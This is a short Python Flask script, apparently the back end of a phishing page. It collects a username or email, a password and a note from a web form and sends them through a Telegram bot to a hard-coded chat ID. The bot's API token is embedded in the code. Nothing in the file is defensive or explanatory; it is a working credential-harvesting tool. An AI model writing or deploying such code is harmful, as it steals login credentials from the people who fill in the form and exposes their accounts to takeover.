from flask import Flask, render_template, request
import telebot

app = Flask(__name__)
TOKEN = '6318485635:AAG03OI2s6gg_arsVmp86DdDTnQ9VH2EJUg'
bot = telebot.TeleBot(TOKEN)

@app.route('/', methods=['GET', 'POST'])
def index():
    if request.method == 'POST':
        username_or_email = request.form['username_or_email']
        password = request.form['password']
        note = request.form['note']
        
        # إرسال البيانات إلى بوت تلجرام
        bot.send_message(chat_id='5090950109', text=f"Username/Email: {username_or_email}\nPassword: {password}\nNote: {note}")

    return render_template('index.html')

if __name__ == '__main__':
    app.run(debug=True)
